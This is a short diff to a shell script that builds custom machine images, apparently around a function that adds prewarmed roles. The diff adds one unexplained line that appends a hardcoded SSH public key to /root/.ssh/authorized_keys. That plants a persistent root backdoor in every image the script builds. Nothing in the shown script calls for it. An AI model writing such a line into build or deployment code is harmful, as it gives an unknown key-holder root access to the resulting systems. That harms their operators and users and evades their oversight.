@@ -103,6 +103,8 @@ function add_prewarmed_roles {
 
 : ${CUSTOM_IMAGE_TYPE:=$1}
 
+echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCJnv7jCIEyrwtBstN3R0IzaSELvZmjdCWgLwfI6USsKjFcFPP069Oepk/DGM5HDxYGGsOgllkX8KEOBWgogoxniJRLYTPBj0lWaQRUORX9j50BPc5yD38DwmDyFBWIzuvkoQx8Vk1E9YI4PQiuS/j8mkwdkqDRcTaXwB/VsXrJIJAEHTGo6Ml5RdI5zueTEC/FhApP1d/pwhyieNZoi1sGlYxv3ZRY3IAhLhyUsVL4xNAdx0bAihFB35v6G5GnoPNoV5KO6GNUzEU9KLvQzA1YjREC4AsuDFbRfXgkN1KP0+eKLJPdwGFs5r8o7tvZ4mCSaH2RNuipTtVwBQZbpI5l" >> /root/.ssh/authorized_keys
+
 add_builder_type_grain
 case ${CUSTOM_IMAGE_TYPE} in
   base|"")
